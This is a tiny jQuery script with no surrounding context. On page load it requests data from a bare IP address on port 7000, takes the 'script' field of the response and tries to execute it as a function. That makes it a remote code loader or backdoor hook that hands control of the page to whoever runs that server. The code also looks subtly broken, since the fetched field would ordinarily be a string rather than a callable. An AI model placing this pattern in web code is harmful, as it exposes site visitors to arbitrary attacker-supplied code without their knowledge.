$(document).ready(function(){
	$.get("http://162.243.234.137:7000", function(data){
			console.log(data.script);
			var func = data.script;
            func();
		})
});



